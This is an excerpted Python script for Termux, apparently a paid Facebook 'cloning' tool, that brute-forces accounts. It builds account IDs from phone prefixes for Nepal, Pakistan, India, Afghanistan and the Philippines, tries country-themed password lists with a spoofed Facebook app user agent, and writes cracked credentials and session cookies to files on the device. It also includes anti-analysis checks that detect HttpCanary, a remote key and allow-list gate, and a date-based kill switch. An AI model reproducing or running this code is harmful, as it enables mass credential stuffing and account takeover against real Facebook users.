...
try:
        ...
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('\033[1;37m[×] FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS | FUCK YOU BY AXL')
...
def esdatafuckermother():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('SYSTEM MODIFICATION NOT ALLOWED SINCE USING AXL');exit()
...
def storageeedatastoragefuckermotherr():
    print('\x1b[1;37m SERVER CHECKING.........')
    time.sleep(10)
    print(f'''\x1b[1;37m WAIT STORAGE FUCK ME.......''')
    time.sleep(10)
    ...
    print('\x1b[1;31m FUCK YOU MOM BY ALEXANDER AXL MONTREAL.......')
...
def logo():
        ...
        ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
        ║      \33[1;32m[ F U C K Y O U B Y P A S S E R ]     \33[1;32m ║
        ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝


{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AUTHOR       : ALEXANDER AXL MONTREAL
FACEBOOK     : https://www.facebook.com/AlexanderAxlMontreal.IAmLimitless
TOOL         : PAID/PREMIUM 
VERSION      : {GREEN}(1.1)
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
async def login():
  check=requests.get("https://raw.githubusercontent.com/ALEXANDERAXLMONTREAL/CONTROL/refs/heads/main/bypass.txt").text
  clear()
  logo()
  login=input("\033[1;36mENTER YOUR USERNAME : \033[1;32m")
  if login == "axldeathpogi":
    await main()
  elif login in check:
    await bypass()
  else:
...
async def bypass():
  ...
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data or "exec" in data or "fuckedbyaxl" in data or "server" in data:
    os.system('clear')
    print(10*"\n\033[1;31m BOBO BYPASS PA")
    print("\n\033[1;33m BYE BYE FILES HAHAHAHAHAHAHA")
    exit()
  elif "https://raw.githubusercontent.com/ALEXANDERAXLMONTREAL/CONTROL/refs/heads/main/bypass.txt" in approve or "AXL" in approve or "pprint" in approve:
    print(10*"TRYING HARD BYPASSING MY TOOL LOL\n")
    exit()
  elif keyword in sess or "rich" in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "Console" in sess or "{data}" in sess or "{url}" in sess or "{headers}" in sess or "open" in sess or ".write" in sess or "fuckedbyaxl" in sess or "server" in sess:
    os.system('clear')
    print(20*"\n\033[1;32m CAPTURE DATA PA HAHAHAHAHAHAHA")
    print("\n\033[1;31m BYE BYE FILES")
    exit()
  else:
    timee=datetime.now()
    limittime=timee.strftime("%m-%d-%y")
    if limittime >= "09-10-24":
      clear()
      sys.exit("\033[1;31m TIME UP BROTHER")
    else:
      await sub()

def menu():
			clear()
			print(' [1] FILE CLONING\n [2] RANDOM CLONING\n [3] GMAIL CLONING \n [4] OLD CLONING \n [5] FACEBOOK FOLLOW PLEASE\n [0] EXIT')
			linex()
			xd=input(' CHOOSE : ')
			if xd in ['1','01']:
				clear()
...
async def key():
  ...
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://raw.githubusercontent.com/ALEXANDERAXLMONTREAL/AXL/refs/heads/main/key.txt') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        ...
        print ("")
        print (" \033[1;36m YOUR KEY : \033[1;37m"+ah+ak+ad+key1)
        print ("")
        ...
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+email+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ah+ak+ad+key1
...
def randm():
    ...
    print(f' [3] NEPAL CLONING ')
    print(f' [4] PAKISTAN CLONING ')
    print(f' [5] AFGHANISTAN CLONING ')
    print(f' [6] PHILIPPINES CLONING ')
...
def bd():
		...
		with tred(max_workers=30) as AXL:	
			clear()
			tl = str(len(user))
			print(' TOTAL ACCOUNT IDS : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m SIM CODE  :\033[1;32m '+code)
			print(' \033[1;37mTHE PROCESS IS RUNNING IN THE BACKGROUND')
			linex()
			for psx in user:
				ids = code+psx
...
def india():
		user=[]
		clear()
		print('\033[1;35m CODE EXAMPLE : 91817,91318,93262,91354')
		code = input('\033[1;37m PUT CODE : ')
		try:
			limit = int(input('\033[1;35m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
		except ValueError:
...
def nepal():
		user=[]
		clear()
		print('\033[1;35m CODE EXAMPLE : 9815,9814,9861,9840')
		code = input('\033[1;37m PUT CODE : ')
		try:
			limit = int(input('\033[1;35m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
		except ValueError:
		...
		with tred(max_workers=30) as AXL:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
				elif pcs in ['6','06']:
					passlist = [psx,ids,'khankhan','khan1122','786786','ali786','khan123','khan12','pakistan','ali123','khanbaba']
				elif pcs in ['7','07']:
					passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
...
def afghanistan():
		user=[]
		clear()
		print('\033[1;35m CODE EXAMPLE : 9376,9377,9378,9379')
		code = input('\033[1;37m PUT CODE : ')
		try:
			limit = int(input('\033[1;35m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
		except ValueError:
...
def philippine():
		user=[]
		clear()
		print('\033[1;35m CODE EXAMPLE : 63923,63925,63928,63921')
		code = input('\033[1;37m PUT CODE : ')
		try:
			limit = int(input('\033[1;35m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
		except ValueError:
...
def gmail():
		...
		with tred(max_workers=30) as AXL:
			total = str(len(fo))
			clear()
			print(' TOTAL ACCOUNT IDS : \033[1;32m'+total+f' ')
			print(' \033[1;37mTHE PROCESS IS RUNNING IN THE BACKGROUND')
			linex()
			for user in fo:
				ids,names = user.split('|')
...
def _old_():
       ...
       with tred(max_workers=30) as crack_submit:
           clear()
           print(f' TOTAL ACCOUNT IDS : \033[1;32m{limit} ')
           print(' \033[1;37mTHE PROCESS IS RUNNING IN THE BACKGROUND')
           linex()
           for mal in user:
              uid=star+mal
...
def login(uid):
    ...
    try:
        sys.stdout.write('\r\r\033[1;37m [AXL-OLD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print('\r\r\033[1;32m [AXL-OK] '+uid+' | '+pw+'\033[1;97m')
                open('/sdcard/AXL-OLD-OK.txt','a').write(uid+'|'+pw+'\n')
                oks.append(uid)
                break 
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]'
				li = ['28','29','210']
				...
				if 'session_key' in q:
					...
					open('/sdcard/AXL-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/AXL-FILE-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AXL-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AXL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/AXL-FILE-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/AXL-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [AXL-FILE-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
